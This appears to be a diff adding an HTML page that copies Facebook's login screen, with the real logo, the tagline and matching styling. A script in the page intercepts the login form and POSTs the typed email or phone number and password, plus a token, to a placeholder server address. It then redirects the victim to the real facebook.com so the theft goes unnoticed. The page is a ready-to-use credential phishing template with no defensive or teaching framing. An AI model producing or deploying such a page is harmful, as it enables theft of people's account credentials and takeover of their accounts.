@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+            color: #1c1e21;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            width: 100%;
+            max-width: 980px;
+            padding: 20px;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        @media (max-width: 899px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+                max-width: 400px;
+            }
+
+            .left-panel {
+                margin-right: 0 !important;
+                margin-bottom: 40px;
+            }
+        }
+
+        .left-panel {
+            flex-basis: 580px;
+            margin-right: 32px;
+            padding-bottom: 112px;
+        }
+
+        .logo {
+            width: 300px;
+            margin-left: -28px;
+        }
+
+        .left-panel h2 {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 500px;
+            margin-top: -20px;
+        }
+
+        @media (max-width: 899px) {
+            .left-panel h2 {
+                width: 100%;
+                font-size: 24px;
+            }
+        }
+
+        .right-panel {
+            flex-basis: 396px;
+        }
+
+        .login-box {
+            background: #fff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .login-form input {
+            width: 100%;
+            height: 52px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+        }
+
+        .login-form input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-btn {
+            width: 100%;
+            height: 48px;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 6px;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot {
+            display: block;
+            color: #1877f2;
+            font-size: 14px;
+            margin-top: 16px;
+            text-decoration: none;
+        }
+
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-btn {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 0 16px;
+            height: 48px;
+            cursor: pointer;
+        }
+
+        .create-btn:hover {
+            background-color: #36a420;
+        }
+
+        .footer-text {
+            margin-top: 28px;
+            font-size: 14px;
+        }
+
+        .footer-text a {
+            text-decoration: none;
+            font-weight: bold;
+            color: #1c1e21;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="left-panel">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lG4t6OnL_a.svg" alt="Facebook" class="logo">
+            <h2>Facebook helps you connect and share with the people in your life.</h2>
+        </div>
+        <div class="right-panel">
+            <div class="login-box">
+                <form class="login-form" id="loginForm">
+                    <input type="text" id="username" placeholder="Email address or phone number"
+                        aria-label="Email address or phone number">
+                    <input type="password" id="password" placeholder="Password" aria-label="Password">
+                    <button type="submit" class="login-btn">Log in</button>
+                    <a href="#" class="forgot">Forgotten password?</a>
+                    <div class="divider"></div>
+                    <button type="button" class="create-btn">Create new account</button>
+                </form>
+            </div>
+            <p class="footer-text"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const u = document.getElementById('username');
+            const p = document.getElementById('password');
+            const data = {
+                token: '__TOKEN__',
+                username: u.value,
+                password: p.value
+            };
+            fetch('__API_URL__', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).finally(() => {
+                window.location.href = 'https://www.facebook.com/';
+            });
+        });
+    </script>
+</body>
+
+</html>
